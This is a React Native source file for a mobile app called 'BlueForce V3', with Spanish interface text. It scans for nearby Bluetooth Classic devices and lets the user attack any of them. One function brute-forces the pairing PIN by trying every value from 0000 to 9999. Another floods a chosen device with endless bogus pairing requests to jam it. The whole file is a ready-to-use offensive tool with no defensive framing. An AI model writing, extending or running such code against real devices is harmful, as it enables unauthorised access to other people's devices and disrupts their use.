import React, { useState, useEffect } from 'react';
import { StyleSheet, Text, View, TouchableOpacity, ScrollView, Alert, PermissionsAndroid, Platform, FlatList, ActivityIndicator } from 'react-native';
import RNBluetoothClassic from 'react-native-bluetooth-classic';

const SignalMeter = ({ rssi }) => {
  const bars = [1, 2, 3, 4, 5];
  let strength = 0;
  if (rssi > -50) strength = 5;
  else if (rssi > -65) strength = 4;
  else if (rssi > -75) strength = 3;
  else if (rssi > -85) strength = 2;
  else if (rssi > -100) strength = 1;

  const getColor = () => {
    if (strength >= 4) return '#00ff88';
    if (strength === 3) return '#ffea00';
    return '#ff3c00';
  };

  return (
    <View style={styles.meterContainer}>
      {bars.map(b => (
        <View key={b} style={[styles.bar, { 
          height: b * 3, 
          backgroundColor: b <= strength ? getColor() : '#222',
          opacity: b <= strength ? 1 : 0.3 
        }]} />
      ))}
    </View>
  );
};

export default function App() {
  const [discoveredDevices, setDiscoveredDevices] = useState([]);
  const [selectedDevice, setSelectedDevice] = useState(null);
  const [isScanning, setIsScanning] = useState(false);
  const [mode, setMode] = useState('IDLE');
  const [currentPin, setCurrentPin] = useState('0000');
  const [logs, setLogs] = useState([]);

  const addLog = (msg) => {
    setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${msg}`, ...prev].slice(0, 100));
  };

  const requestPermissions = async () => {
    if (Platform.OS === 'android') {
      await PermissionsAndroid.requestMultiple([
        PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
        PermissionsAndroid.PERMISSIONS.BLUETOOTH_SCAN,
        PermissionsAndroid.PERMISSIONS.BLUETOOTH_CONNECT,
      ]);
    }
  };

  useEffect(() => { requestPermissions(); }, []);

  const scan = async () => {
    if (isScanning) return;
    setIsScanning(true);
    setDiscoveredDevices([]);
    addLog("📡 Escaneando área táctica...");
    try {
      const devices = await RNBluetoothClassic.startDiscovery();
      setDiscoveredDevices(devices.sort((a, b) => b.rssi - a.rssi)); // Los más cercanos arriba
      addLog(`🔍 Encontrados ${devices.length} objetivos.`);
    } catch (err) { addLog(`⚠️ ERROR: ${err.message}`); }
    finally { setIsScanning(false); }
  };

  const startBruteForce = async (device) => {
    setSelectedDevice(device);
    setMode('BRUTE');
    for (let i = 0; i <= 9999; i++) {
      let m; setMode(cur => { m = cur; return cur; });
      if (m !== 'BRUTE') break;
      const pin = i.toString().padStart(4, '0');
      setCurrentPin(pin);
      try {
        const ok = await RNBluetoothClassic.pairDevice(device.address, { pin });
        if (ok) {
          addLog("🎯 PIN CORRECTO!");
          setMode('IDLE');
          Alert.alert("CONECTADO", `PIN: ${pin}`);
          break;
        }
      } catch (e) {
        if (i % 10 === 0) addLog(`🛰️ Probando ${pin}...`);
        await new Promise(r => setTimeout(r, 600));
      }
    }
    setMode('IDLE');
  };

  const startJammer = async (device) => {
    setSelectedDevice(device);
    setMode('JAMMER');
    addLog(`🔥 BLOQUEANDO: ${device.name || device.address}`);
    while (true) {
      let m; setMode(cur => { m = cur; return cur; });
      if (m !== 'JAMMER') break;
      try { await RNBluetoothClassic.pairDevice(device.address, { pin: '0' }); } catch (e) {}
    }
  };

  const stop = () => { setMode('IDLE'); addLog("⏹️ Operación detenida."); };

  const renderItem = ({ item }) => (
    <View style={styles.card}>
      <SignalMeter rssi={item.rssi} />
      <View style={{ flex: 1, marginLeft: 15 }}>
        <Text style={styles.name}>{item.name || "DESCONOCIDO"}</Text>
        <Text style={styles.mac}>{item.address}</Text>
      </View>
      <View style={{ flexDirection: 'row' }}>
        <TouchableOpacity style={styles.btnA} onPress={() => startBruteForce(item)} disabled={mode !== 'IDLE'}>
          <Text style={styles.btnText}>PIN</Text>
        </TouchableOpacity>
        <TouchableOpacity style={[styles.btnA, { backgroundColor: '#ff0055', marginLeft: 5 }]} onPress={() => startJammer(item)} disabled={mode !== 'IDLE'}>
          <Text style={styles.btnText}>BLOCK</Text>
        </TouchableOpacity>
      </View>
    </View>
  );

  return (
    <View style={styles.container}>
      <View style={styles.header}>
        <Text style={styles.title}>BlueForce V3</Text>
        <View style={[styles.badge, { backgroundColor: mode === 'IDLE' ? '#222' : '#ff0055' }]}>
          <Text style={styles.badgeText}>{mode === 'IDLE' ? 'READY' : mode}</Text>
        </View>
      </View>
      
      <View style={styles.main}>
        <Text style={styles.pin}>PIN: {currentPin}</Text>
        <TouchableOpacity style={[styles.scanBtn, isScanning && {opacity: 0.5}]} onPress={scan} disabled={isScanning || mode !== 'IDLE'}>
          {isScanning ? <ActivityIndicator color="#fff" /> : <Text style={styles.scanText}>LOCALIZAR DISPOSITIVOS</Text>}
        </TouchableOpacity>
      </View>

      <FlatList data={discoveredDevices} renderItem={renderItem} keyExtractor={i => i.address} style={{ flex: 1 }} />

      {mode !== 'IDLE' && (
        <TouchableOpacity style={styles.stop} onPress={stop}><Text style={styles.stopText}>DETENER ATAQUE</Text></TouchableOpacity>
      )}

      <ScrollView style={styles.logs}>{logs.map((l, i) => <Text key={i} style={styles.logLine}>{l}</Text>)}</ScrollView>
    </View>
  );
}

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: '#000', padding: 20, paddingTop: 40 },
  header: { flexDirection: 'row', justifyContent: 'space-between', marginBottom: 20 },
  title: { color: '#00f2ff', fontSize: 22, fontWeight: 'bold' },
  badge: { paddingHorizontal: 12, paddingVertical: 4, borderRadius: 10 },
  badgeText: { color: '#fff', fontSize: 10, fontWeight: 'bold' },
  main: { backgroundColor: '#111', padding: 20, borderRadius: 15, marginBottom: 20 },
  pin: { color: '#fff', fontSize: 40, fontWeight: 'bold', textAlign: 'center', marginBottom: 15, fontFamily: 'monospace' },
  scanBtn: { backgroundColor: '#00f2ff', padding: 15, borderRadius: 10, alignItems: 'center' },
  scanText: { color: '#000', fontWeight: 'bold' },
  card: { backgroundColor: '#181818', padding: 15, borderRadius: 12, marginBottom: 10, flexDirection: 'row', alignItems: 'center' },
  name: { color: '#fff', fontWeight: 'bold', fontSize: 13 },
  mac: { color: '#444', fontSize: 9 },
  meterContainer: { flexDirection: 'row', alignItems: 'flex-end', width: 25 },
  bar: { width: 3, marginRight: 2, borderRadius: 1 },
  btnA: { backgroundColor: '#333', paddingVertical: 8, paddingHorizontal: 12, borderRadius: 8 },
  btnText: { color: '#fff', fontSize: 10, fontWeight: 'bold' },
  stop: { backgroundColor: '#ff0055', padding: 15, borderRadius: 12, alignItems: 'center', marginBottom: 15 },
  stopText: { color: '#fff', fontWeight: 'bold' },
  logs: { height: 80, backgroundColor: '#0a0a0a', padding: 10, borderRadius: 10 },
  logLine: { color: '#333', fontSize: 9 }
});
